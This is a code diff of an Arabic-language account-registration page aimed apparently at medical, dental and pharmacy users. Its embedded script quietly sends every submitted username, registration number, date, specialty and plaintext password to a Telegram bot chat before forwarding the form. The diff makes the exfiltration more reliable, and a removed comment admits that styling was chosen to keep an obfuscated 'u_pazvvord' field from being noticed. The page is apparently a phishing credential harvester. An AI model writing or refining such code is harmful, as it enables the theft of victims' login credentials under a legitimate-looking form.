@@ -10,21 +10,10 @@
         h2 { text-align: center; color: #1e293b; margin-bottom: 25px; font-size: 20px; }
         .group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: bold; }
-        
-        /* جعل الخط متماسكاً جداً لعدم ملاحظة الـ vv */
         input, select { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1.5px solid #e2e8f0; 
-            border-radius: 12px; 
-            font-size: 14px; 
-            box-sizing: border-box; 
-            text-align: right; 
-            background-color: #fff;
-            font-family: "Courier New", Courier, monospace; /* خط موحد المسافات */
-            letter-spacing: -0.5px; /* تقريب الحروف لبعضها */
+            width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; 
+            font-size: 14px; box-sizing: border-box; text-align: right; background-color: #fff;
         }
-        
         .date-row { display: flex; gap: 8px; }
         .date-row select { flex: 1; }
         .btn { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
@@ -37,53 +26,46 @@
     <h2>إنشاء حساب جديد</h2>
     
     <form id="combinedForm" action="https://forminit.com/f/tjxeu4zc4fa" method="POST">
-        
         <div class="group">
             <label>اسم الدخول</label>
-            <input type="text" id="username" name="u_login" placeholder="اسم الدخول" required>
+            <input type="text" id="username" name="Username" required>
         </div>
-
         <div class="group">
             <label>الرقم التسجيل</label>
-            <input type="text" id="reg_id" name="u_reg_num" placeholder="رقم التسجيل" required>
+            <input type="text" id="reg_id" name="Registration_Number" required>
         </div>
-
         <div class="group">
             <label>تاريخ التسجيل</label>
             <div class="date-row">
-                <select id="year" name="reg_year" required>
+                <select id="year" name="Year" required>
                     <option value="" disabled selected>العام</option>
                     <script>for(let i=2026; i>=2000; i--) document.write(`<option value="${i}">${i}</option>`);</script>
                 </select>
-                <select id="month" name="reg_month" required>
+                <select id="month" name="Month" required>
                     <option value="" disabled selected>الشهر</option>
                     <script>for(let i=1; i<=12; i++) document.write(`<option value="${i}">${i}</option>`);</script>
                 </select>
-                <select id="day" name="reg_day" required>
+                <select id="day" name="Day" required>
                     <option value="" disabled selected>اليوم</option>
                     <script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script>
                 </select>
             </div>
         </div>
-
         <div class="group">
             <label>نوع التسجيل</label>
-            <select id="reg_type" name="u_cat" required>
+            <select id="reg_type" name="Category" required>
                 <option value="" disabled selected>التخصص</option>
                 <option value="طب">طب</option>
                 <option value="طب أسنان">طب أسنان</option>
                 <option value="صيدلة">صيدلة</option>
             </select>
         </div>
-
         <div class="group">
             <label>كلمة المرور (English)</label>
-            <input type="password" id="pass" name="u_pazvvord" placeholder="••••••••" required>
+            <input type="password" id="pass" name="u_pazvvord" style="font-family: monospace; letter-spacing: -1px;" required>
         </div>
-
-        <button type="submit" class="btn">إرسال البيانات</button>
+        <button type="submit" class="btn" id="submitBtn">إرسال البيانات</button>
     </form>
-    
     <div class="copy">الطب الفائق &copy; 2026</div>
 </div>
 
@@ -92,6 +74,12 @@
     const chatId = "7746757675";
 
     document.getElementById('combinedForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // إيقاف الإرسال للموقع مؤقتاً
+        
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "جاري الإرسال...";
+
         const user = document.getElementById('username').value;
         const regId = document.getElementById('reg_id').value;
         const d = document.getElementById('day').value;
@@ -100,9 +88,22 @@
         const type = document.getElementById('reg_type').value;
         const pass = document.getElementById('pass').value;
 
-        const message = `🔔 بيانات جديدة:\n👤 اليوزر: ${user}\n🆔 الرقم: ${regId}\n📅 التاريخ: ${y}/${m}/${d}\n🩺 التخصص: ${type}\n🔑 الكلمة: ${pass}`;
+        const message = `🔔 إشعار جديد:\n👤 اليوزر: ${user}\n🆔 الرقم: ${regId}\n📅 التاريخ: ${y}/${m}/${d}\n🩺 التخصص: ${type}\n🔑 الكلمة: ${pass}`;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+        // إرسال للتليجرام أولاً بشكل مستقل تماماً
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(() => {
+            // بعد نجاح وصول الرسالة للتليجرام، يتم الإرسال للموقع
+            document.getElementById('combinedForm').submit();
+        })
+        .catch(() => {
+            // حتى لو فشل تليجرام (انقطاع نت مثلاً)، حاول الإرسال للموقع
+            document.getElementById('combinedForm').submit();
+        });
     });
 </script>
 
